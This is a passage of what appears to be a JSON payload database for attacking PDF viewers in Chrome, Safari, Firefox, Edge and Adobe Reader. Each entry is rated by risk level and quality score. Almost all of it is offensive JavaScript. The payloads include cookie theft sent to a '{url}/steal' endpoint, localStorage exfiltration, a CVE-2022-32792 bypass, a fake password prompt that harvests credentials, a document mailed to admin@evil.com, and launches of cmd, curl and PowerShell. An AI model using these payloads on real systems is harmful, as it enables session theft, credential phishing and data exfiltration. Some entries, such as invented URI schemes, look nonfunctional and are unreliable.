      "last_updated": "2025-07-30T14:38:01.947859"
    },
    {
      "id": "safari_011",
      "category": "webkit_specific",
      "technique": "clipboard_manipulation",
      "payload": "navigator.clipboard.writeText('Clipboard text compromised').then(function(){fetch('{url}/clipboard?status=compromised')}).catch(function(err){fetch('{url}/clipboard?error='+encodeURIComponent(err))});",
      "description": "Safari PDFKit clipboard access and manipulation",
      "risk_level": "medium",
      "browser": "safari",
      "detected_techniques": [
        "network_exfiltration"
      ],
      "quality_score": 40,
      "payload_length": 200,
      "last_updated": "2025-07-30T14:38:01.948521"
    },
    {
      "id": "chrome_008",
      "category": "sandbox_escape",
      "technique": "extension_api_abuse",
      "payload": "try { chrome.extension.sendMessage({action:'xss',data:location.href,target:'{url}'}); } catch(e) { }",
      "description": "Chrome extension API abuse for sandbox escape",
      "risk_level": "critical",
      "browser": "chrome",
      "detected_techniques": [],
      "quality_score": 35,
      "payload_length": 100,
      "last_updated": "2025-07-30T14:38:01.947201"
    },
    {
      "id": "chrome_010",
      "category": "sandbox_escape",
      "technique": "webrtc_exploit",
      "payload": "try { var pc = new RTCPeerConnection(); var dc = pc.createDataChannel('exploit'); dc.onopen = function() { location = '{url}'; }; } catch(e) { }",
      "description": "Chrome WebRTC data channel abuse for sandbox escape",
      "risk_level": "high",
      "browser": "chrome",
      "detected_techniques": [],
      "quality_score": 35,
      "payload_length": 144,
      "last_updated": "2025-07-30T14:38:01.947224"
    },
    {
      "id": "chrome_011",
      "category": "dom_access",
      "technique": "basic_js_execution",
      "payload": "app.alert('XSS in Chrome PDF Viewer'); try { app.doc.exportDataObject({cName: 'test.html', nLaunch: 2}); } catch(e) { app.alert(e); }",
      "description": "Basic Chrome PDF viewer JavaScript execution with file export",
      "risk_level": "medium",
      "browser": "chrome",
      "detected_techniques": [
        "pdf_specific"
      ],
      "quality_score": 35,
      "payload_length": 133,
      "last_updated": "2025-07-30T14:38:01.947237"
    },
    {
      "id": "chrome_013",
      "category": "dom_access",
      "technique": "javascript_launch_url",
      "payload": "try { app.alert('XSS via PDF in Chrome'); app.launchURL('javascript:alert(document.cookie)', true); } catch(e) { app.alert(e); }",
      "description": "Chrome PDF JavaScript URL launch to access document cookies",
      "risk_level": "high",
      "browser": "chrome",
      "detected_techniques": [
        "pdf_specific"
      ],
      "quality_score": 35,
      "payload_length": 128,
      "last_updated": "2025-07-30T14:38:01.947264"
    },
    {
      "id": "chrome_014",
      "category": "dom_access",
      "technique": "cookie_exfiltration",
      "payload": "app.launchURL('javascript:fetch(\\'{url}/steal?cookie=\\'+document.cookie)', true);",
      "description": "Chrome PDF cookie exfiltration via JavaScript URL launch",
      "risk_level": "high",
      "browser": "chrome",
      "detected_techniques": [
        "network_exfiltration"
      ],
      "quality_score": 30,
      "payload_length": 81,
      "last_updated": "2025-07-30T14:38:01.947273"
    },
    {
      "id": "safari_002",
      "category": "dom_access",
      "technique": "dom_cookie_theft",
      "payload": "document.body.innerHTML='<img src=x onerror=fetch(\"{url}/dom?cookie=\"+document.cookie)>'",
      "description": "Safari PDFKit DOM manipulation for cookie theft via HTML injection",
      "risk_level": "high",
      "browser": "safari",
      "detected_techniques": [
        "network_exfiltration"
      ],
      "quality_score": 30,
      "payload_length": 88,
      "last_updated": "2025-07-30T14:38:01.948559"
    },
    {
      "id": "safari_009",
      "category": "dom_access",
      "technique": "localstorage_manipulation",
      "payload": "localStorage.setItem('pwned','true');fetch('{url}/storage?data='+localStorage.getItem('pwned'))",
      "description": "Safari PDFKit localStorage manipulation and data exfiltration",
      "risk_level": "medium",
      "browser": "safari",
      "detected_techniques": [
        "network_exfiltration"
      ],
      "quality_score": 30,
      "payload_length": 95,
      "last_updated": "2025-07-30T14:38:01.948568"
    },
    {
      "id": "safari_012",
      "category": "webkit_specific",
      "technique": "cve_2022_32792_exploit",
      "payload": "location='javascript:/*</script><svg/onload=fetch(\"{url}/cve?domain=\"+document.domain)>//';//'",
      "description": "Safari PDFKit CVE-2022-32792 XSS protection bypass exploit",
      "risk_level": "critical",
      "browser": "safari",
      "detected_techniques": [
        "network_exfiltration"
      ],
      "quality_score": 30,
      "payload_length": 94,
      "last_updated": "2025-07-30T14:38:01.948577"
    },
    {
      "id": "chrome_009",
      "category": "sandbox_escape",
      "technique": "service_worker_exploit",
      "payload": "try { navigator.serviceWorker.register('data:text/javascript,location=\"{url}\"'); } catch(e) { }",
      "description": "Chrome service worker exploitation for sandbox escape",
      "risk_level": "high",
      "browser": "chrome",
      "detected_techniques": [],
      "quality_score": 25,
      "payload_length": 95,
      "last_updated": "2025-07-30T14:38:01.947211"
    },
    {
      "id": "adobe_014",
      "category": "privilege_escalation",
      "technique": "trust_propagator",
      "payload": "app.trustPropagatorFunction(function() {app.launchURL('{url}');});",
      "description": "Adobe Reader privilege escalation via trust propagator",
      "risk_level": "critical",
      "browser": "adobe",
      "detected_techniques": [
        "dynamic_execution"
      ],
      "quality_score": 25,
      "payload_length": 66,
      "last_updated": "2025-07-30T14:38:01.947521"
    },
    {
      "id": "firefox_007",
      "category": "dom_access",
      "technique": "dom_manipulation",
      "payload": "document.body.innerHTML='<h1>This PDF has been hacked</h1><img src=x onerror=alert(document.domain)>'",
      "description": "Firefox PDF.js DOM manipulation to inject malicious HTML",
      "risk_level": "high",
      "browser": "firefox",
      "detected_techniques": [],
      "quality_score": 25,
      "payload_length": 101,
      "last_updated": "2025-07-30T14:38:01.947773"
    },
    {
      "id": "adobe_003",
      "category": "api_abuse",
      "technique": "user_response_dialog",
      "payload": "app.response({cQuestion: 'Enter password:', cTitle: 'Security Check', bPassword: true, cResponse: '{url}'});",
      "description": "Adobe Reader credential harvesting via response dialog",
      "risk_level": "critical",
      "browser": "adobe",
      "detected_techniques": [],
      "quality_score": 20,
      "payload_length": 108,
      "last_updated": "2025-07-30T14:38:01.947425"
    },
    {
      "id": "adobe_015",
      "category": "api_abuse",
      "technique": "timed_execution",
      "payload": "app.setInterval('app.launchURL(\\'{url}\\')', 5000);",
      "description": "Adobe Reader persistent timed execution every 5 seconds",
      "risk_level": "high",
      "browser": "adobe",
      "detected_techniques": [],
      "quality_score": 20,
      "payload_length": 50,
      "last_updated": "2025-07-30T14:38:01.947530"
    },
    {
      "id": "edge_001",
      "category": "webview_exploit",
      "technique": "webview_postmessage",
      "payload": "window.chrome.webview.postMessage('{url}');",
      "description": "Edge PDF WebView postMessage exploitation",
      "risk_level": "high",
      "browser": "edge",
      "detected_techniques": [
        "postmessage_abuse"
      ],
      "quality_score": 20,
      "payload_length": 43,
      "last_updated": "2025-07-30T14:38:01.948608"
    },
    {
      "id": "adobe_002",
      "category": "api_abuse",
      "technique": "form_submission",
      "payload": "this.submitForm({cURL: '{url}', cSubmitAs: 'HTML'});",
      "description": "Adobe Reader form submission to external URL as HTML",
      "risk_level": "high",
      "browser": "adobe",
      "detected_techniques": [],
      "quality_score": 10,
      "payload_length": 52,
      "last_updated": "2025-07-30T14:38:01.947410"
    },
    {
      "id": "adobe_006",
      "category": "file_system",
      "technique": "browse_for_doc",
      "payload": "app.browseForDoc({bSave: true, cFilenameEdit: '{url}'});",
      "description": "Adobe Reader file browser manipulation for data access",
      "risk_level": "medium",
      "browser": "adobe",
      "detected_techniques": [],
      "quality_score": 10,
      "payload_length": 56,
      "last_updated": "2025-07-30T14:38:01.947449"
    },
    {
      "id": "adobe_007",
      "category": "api_abuse",
      "technique": "silent_print",
      "payload": "this.print({bUI: false, bSilent: true, bShrinkToFit: true, cPath: '{url}'});",
      "description": "Adobe Reader silent print operation to external URL",
      "risk_level": "medium",
      "browser": "adobe",
      "detected_techniques": [],
      "quality_score": 10,
      "payload_length": 76,
      "last_updated": "2025-07-30T14:38:01.947459"
    },
    {
      "id": "adobe_008",
      "category": "network_exfiltration",
      "technique": "http_request",
      "payload": "Net.HTTP.request({cURL: '{url}', cMethod: 'POST', cParams: document.URL});",
      "description": "Adobe Reader HTTP request with document URL exfiltration",
      "risk_level": "high",
      "browser": "adobe",
      "detected_techniques": [],
      "quality_score": 10,
      "payload_length": 74,
      "last_updated": "2025-07-30T14:38:01.947468"
    },
    {
      "id": "adobe_009",
      "category": "network_exfiltration",
      "technique": "http_response_handler",
      "payload": "Net.HTTP.request({cURL: '{url}', oHandler: {response: function(msg) {app.alert(msg);}}});",
      "description": "Adobe Reader HTTP request with response handler",
      "risk_level": "medium",
      "browser": "adobe",
      "detected_techniques": [
        "pdf_specific"
      ],
      "quality_score": 10,
      "payload_length": 89,
      "last_updated": "2025-07-30T14:38:01.947478"
    },
    {
      "id": "adobe_010",
      "category": "network_exfiltration",
      "technique": "email_document",
      "payload": "this.mailDoc({bUI: false, cTo: 'admin@evil.com', cSubject: 'PDF Exploit', cMsg: '{url}'});",
      "description": "Adobe Reader automatic email document to attacker",
      "risk_level": "high",
      "browser": "adobe",
      "detected_techniques": [],
      "quality_score": 10,
      "payload_length": 90,
      "last_updated": "2025-07-30T14:38:01.947488"
    },
    {
      "id": "edge_003",
      "category": "windows_integration",
      "technique": "settings_privacy_access",
      "payload": "app.launchURL('ms-settings:privacy-webcam?url={url}', true);",
      "description": "Edge PDF Windows Settings privacy access with parameter injection",
      "risk_level": "medium",
      "browser": "edge",
      "detected_techniques": [],
      "quality_score": 10,
      "payload_length": 60,
      "last_updated": "2025-07-30T14:38:01.948642"
    },
    {
      "id": "edge_004",
      "category": "windows_integration",
      "technique": "available_networks",
      "payload": "app.launchURL('ms-availablenetworks:?target={url}', true);",
      "description": "Edge PDF Windows available networks access with URL injection",
      "risk_level": "medium",
      "browser": "edge",
      "detected_techniques": [],
      "quality_score": 10,
      "payload_length": 58,
      "last_updated": "2025-07-30T14:38:01.948650"
    },
    {
      "id": "edge_005",
      "category": "windows_integration",
      "technique": "power_settings",
      "payload": "app.launchURL('ms-settings-power:?exploit={url}', true);",
      "description": "Edge PDF Windows power settings access with parameter injection",
      "risk_level": "low",
      "browser": "edge",
      "detected_techniques": [],
      "quality_score": 10,
      "payload_length": 56,
      "last_updated": "2025-07-30T14:38:01.948662"
    },
    {
      "id": "edge_006",
      "category": "windows_integration",
      "technique": "apps_folder_access",
      "payload": "app.launchURL('shell:AppsFolder?url={url}', true);",
      "description": "Edge PDF Windows Apps folder access with URL parameter",
      "risk_level": "medium",
      "browser": "edge",
      "detected_techniques": [],
      "quality_score": 10,
      "payload_length": 50,
      "last_updated": "2025-07-30T14:38:01.948686"
    },
    {
      "id": "edge_007",
      "category": "registry_manipulation",
      "technique": "registry_edge_access",
      "payload": "app.launchURL('regedit://HKEY_CURRENT_USER/Software/Microsoft/Edge?url={url}', true);",
      "description": "Edge PDF Windows Registry access attempt with URL injection",
      "risk_level": "high",
      "browser": "edge",
      "detected_techniques": [],
      "quality_score": 10,
      "payload_length": 85,
      "last_updated": "2025-07-30T14:38:01.948698"
    },
    {
      "id": "edge_008",
      "category": "windows_integration",
      "technique": "powershell_execution",
      "payload": "app.launchURL('powershell://Invoke-WebRequest -Uri {url}', true);",
      "description": "Edge PDF PowerShell execution via URL scheme",
      "risk_level": "critical",
      "browser": "edge",
      "detected_techniques": [],
      "quality_score": 10,
      "payload_length": 65,
      "last_updated": "2025-07-30T14:38:01.948707"
    },
    {
      "id": "edge_010",
      "category": "windows_integration",
      "technique": "windows_store_apps",
      "payload": "app.launchURL('ms-windows-store://pdp/?ProductId=exploit&url={url}', true);",
      "description": "Edge PDF Windows Store app access with URL parameter injection",
      "risk_level": "medium",
      "browser": "edge",
      "detected_techniques": [],
      "quality_score": 10,
      "payload_length": 75,
      "last_updated": "2025-07-30T14:38:01.948716"
    },
    {
      "id": "edge_011",
      "category": "file_system",
      "technique": "calculator_execution",
      "payload": "app.launchURL('file:///C:/Windows/System32/calc.exe?url={url}', true);",
      "description": "Edge PDF Windows Calculator execution with parameter injection",
      "risk_level": "high",
      "browser": "edge",
      "detected_techniques": [
        "file_access"
      ],
      "quality_score": 10,
      "payload_length": 70,
      "last_updated": "2025-07-30T14:38:01.948725"
    },
    {
      "id": "edge_012",
      "category": "file_system",
      "technique": "public_documents_access",
      "payload": "app.launchURL('file:///C:/Users/Public/Documents/?target={url}', true);",
      "description": "Edge PDF Windows Public Documents access with URL parameter",
      "risk_level": "medium",
      "browser": "edge",
      "detected_techniques": [
        "file_access"
      ],
      "quality_score": 10,
      "payload_length": 71,
      "last_updated": "2025-07-30T14:38:01.948734"
    },
    {
      "id": "safari_005",
      "category": "macos_integration",
      "technique": "applescript_execution",
      "payload": "app.launchURL('osascript://tell%20application%20\"Safari\"%20to%20open%20location%20\"{url}\"', true);",
      "description": "Safari PDFKit AppleScript execution for Safari navigation",
      "risk_level": "critical",
      "browser": "safari",
      "detected_techniques": [],
      "quality_score": 10,
      "payload_length": 98,
      "last_updated": "2025-07-30T14:38:01.948743"
    },
    {
      "id": "safari_006",
      "category": "macos_integration",
      "technique": "system_preferences_access",
      "payload": "app.launchURL('x-apple.systempreferences:com.apple.preference.security?url={url}', true);",
      "description": "Safari PDFKit system preferences access with parameter injection",
      "risk_level": "medium",
      "browser": "safari",
      "detected_techniques": [],
      "quality_score": 10,
      "payload_length": 89,
      "last_updated": "2025-07-30T14:38:01.948752"
    },
    {
      "id": "safari_007",
      "category": "file_system",
      "technique": "applications_directory_access",
      "payload": "app.launchURL('file:///Applications/Calculator.app', true);",
      "description": "Safari PDFKit file system access to Applications directory",
      "risk_level": "high",
      "browser": "safari",
      "detected_techniques": [
        "file_access"
      ],
      "quality_score": 10,
      "payload_length": 59,
      "last_updated": "2025-07-30T14:38:01.948760"
    },
    {
      "id": "safari_008",
      "category": "file_system",
      "technique": "system_library_access",
      "payload": "app.launchURL('file:///System/Library/CoreServices/Finder.app', true);",
      "description": "Safari PDFKit access to system library applications",
      "risk_level": "high",
      "browser": "safari",
      "detected_techniques": [
        "file_access"
      ],
      "quality_score": 10,
      "payload_length": 70,
      "last_updated": "2025-07-30T14:38:01.948768"
    },
    {
      "id": "chrome_004",
      "category": "file_system",
      "technique": "local_file_access",
      "payload": "app.launchURL('file:///etc/passwd', true);",
      "description": "Chrome PDFium local file access attempt",
      "risk_level": "critical",
      "browser": "chrome",
      "detected_techniques": [
        "file_access"
      ],
      "quality_score": 5,
      "payload_length": 42,
      "last_updated": "2025-07-30T14:38:01.947163"
    },
    {
      "id": "chrome_005",
      "category": "file_system",
      "technique": "directory_traversal",
      "payload": "app.launchURL('file:///home/', true);",
      "description": "Chrome PDFium directory traversal exploit",
      "risk_level": "critical",
      "browser": "chrome",
      "detected_techniques": [
        "file_access"
      ],
      "quality_score": 5,
      "payload_length": 37,
      "last_updated": "2025-07-30T14:38:01.947172"
    },
    {
      "id": "chrome_006",
      "category": "command_execution",
      "technique": "protocol_handler_abuse",
      "payload": "app.launchURL('ms-calculator://', true);",
      "description": "Chrome PDFium protocol handler abuse for command execution",
      "risk_level": "critical",
      "browser": "chrome",
      "detected_techniques": [],
      "quality_score": 5,
      "payload_length": 40,
      "last_updated": "2025-07-30T14:38:01.947180"
    },
    {
      "id": "chrome_007",
      "category": "command_execution",
      "technique": "uri_scheme_abuse",
      "payload": "app.launchURL('calculator://', true);",
      "description": "Chrome PDFium URI scheme abuse for calculator execution",
      "risk_level": "critical",
      "browser": "chrome",
      "detected_techniques": [],
      "quality_score": 5,
      "payload_length": 37,
      "last_updated": "2025-07-30T14:38:01.947188"
    },
    {
      "id": "firefox_001",
      "category": "dom_access",
      "technique": "basic_alert",
      "payload": "alert(document.domain)",
      "description": "Basic Firefox PDF.js domain disclosure via alert",
      "risk_level": "low",
      "browser": "firefox",
      "detected_techniques": [],
      "quality_score": 5,
      "payload_length": 22,
      "last_updated": "2025-07-30T14:38:01.947709"
    },
    {
      "id": "adobe_001",
      "category": "api_abuse",
      "technique": "basic_launch_url",
      "payload": "app.launchURL('{url}', true);",
      "description": "Adobe Reader basic URL launch with trusted execution",
      "risk_level": "high",
      "browser": "adobe",
      "detected_techniques": [],
      "quality_score": 0,
      "payload_length": 29,
      "last_updated": "2025-07-30T14:38:01.947397"
    },
    {
      "id": "adobe_004",
      "category": "file_system",
      "technique": "export_as_text",
      "payload": "this.exportAsText({cPath: '{url}'});",
      "description": "Adobe Reader text export to external URL for data exfiltration",
      "risk_level": "medium",
      "browser": "adobe",
      "detected_techniques": [],
      "quality_score": 0,
      "payload_length": 36,
      "last_updated": "2025-07-30T14:38:01.947433"
    },
    {
      "id": "adobe_005",
      "category": "file_system",
      "technique": "save_as_operation",
      "payload": "this.saveAs({cPath: '{url}'});",
      "description": "Adobe Reader save operation to external URL",
      "risk_level": "medium",
      "browser": "adobe",
      "detected_techniques": [],
      "quality_score": 0,
      "payload_length": 30,
      "last_updated": "2025-07-30T14:38:01.947441"
    },
    {
      "id": "adobe_011",
      "category": "file_system",
      "technique": "file_stream_read",
      "payload": "util.readFileIntoStream('{url}');",
      "description": "Adobe Reader file stream reading from external URL",
      "risk_level": "high",
      "browser": "adobe",
      "detected_techniques": [],
      "quality_score": 0,
      "payload_length": 33,
      "last_updated": "2025-07-30T14:38:01.947495"
    },
    {
      "id": "adobe_012",
      "category": "api_abuse",
      "technique": "document_url_access",
      "payload": "this.getURL('{url}');",
      "description": "Adobe Reader document URL access for navigation",
      "risk_level": "medium",
      "browser": "adobe",
      "detected_techniques": [],
      "quality_score": 0,
      "payload_length": 21,
      "last_updated": "2025-07-30T14:38:01.947503"
    },
    {
      "id": "adobe_013",
      "category": "api_abuse",
      "technique": "import_data_object",
      "payload": "this.importDataObject('{url}');",
      "description": "Adobe Reader data object import from external URL",
      "risk_level": "high",
      "browser": "adobe",
      "detected_techniques": [],
      "quality_score": 0,
      "payload_length": 31,
      "last_updated": "2025-07-30T14:38:01.947512"
    },
    {
      "id": "edge_002",
      "category": "webview_exploit",
      "technique": "external_notify",
      "payload": "window.external.notify('{url}');",
      "description": "Edge PDF external notify method for data exfiltration",
      "risk_level": "medium",
      "browser": "edge",
      "detected_techniques": [],
      "quality_score": 0,
      "payload_length": 32,
      "last_updated": "2025-07-30T14:38:01.948811"
    },
    {
      "id": "edge_009",
      "category": "windows_integration",
      "technique": "cmd_execution",
      "payload": "app.launchURL('cmd://curl {url}', true);",
      "description": "Edge PDF command prompt execution via URL scheme",
      "risk_level": "critical",
      "browser": "edge",
      "detected_techniques": [],
      "quality_score": 0,
      "payload_length": 40,
      "last_updated": "2025-07-30T14:38:01.948821"
    }
  ]
}